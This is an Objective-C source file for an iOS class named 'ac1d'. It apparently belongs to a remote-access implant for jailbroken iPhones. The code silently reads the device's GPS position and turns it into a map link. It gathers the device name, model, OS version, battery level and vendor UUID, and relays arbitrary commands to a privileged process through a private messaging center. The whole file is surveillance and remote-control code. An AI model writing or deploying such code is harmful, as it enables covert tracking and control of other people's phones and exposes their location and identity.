#import "ac1d.h"

@implementation ac1d

-(id)init {
    _thisUIDevice = [UIDevice currentDevice];
    [_thisUIDevice setBatteryMonitoringEnabled:YES];
    _messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.ac1d"];
    return self;
}

-(void)battery {
    int battery_level = ([_thisUIDevice batteryLevel] * 100);
    printf("%d", battery_level);
}

-(void)locate {
    CLLocationManager* manager = [[CLLocationManager alloc] init];
    [manager startUpdatingLocation];
    CLLocation *location = [manager location];
    CLLocationCoordinate2D coordinate = [location coordinate];
    NSString *result = [NSString stringWithFormat:@"Latitude: %f\nLongitude: %f\nhttp://maps.google.com/maps?q=%f,%f", coordinate.latitude, coordinate.longitude, coordinate.latitude, coordinate.longitude];
    if ((int)(coordinate.latitude + coordinate.longitude) == 0) {
        result = @"error";
    }
    [manager release];
    printf("%s", [result cStringUsingEncoding:NSUTF8StringEncoding]);
}

-(void)sysinfo {
    UIDevice *device = [UIDevice currentDevice];
    int batinfo = ([_thisUIDevice batteryLevel]*100);
    NSString *info = [NSString stringWithFormat:@"%@ %d %@ %@ %@ %@", [device model], batinfo, [device systemName], [device systemVersion], [device name], [[device identifierForVendor] UUIDString]];
    printf("%s", [info cStringUsingEncoding:NSUTF8StringEncoding]);
}

-(void)send_command:(NSString *)command :(NSString *)arg1 :(NSString *)arg2 {
    NSArray *keys = [NSArray arrayWithObjects:@"cmd", @"arg1", @"arg2", nil];
    NSArray *values = [NSArray arrayWithObjects:command, arg1, arg2, nil];
    NSDictionary *userInfo = [NSDictionary dictionaryWithObjects:values forKeys:keys];
    NSDictionary *reply = [_messagingCenter sendMessageAndReceiveReplyName:@"recieve_command" userInfo:userInfo];
    NSString *replystr = [reply objectForKey:@"returnStatus"];
    printf("%s", [replystr cStringUsingEncoding:NSUTF8StringEncoding]);
}

@end
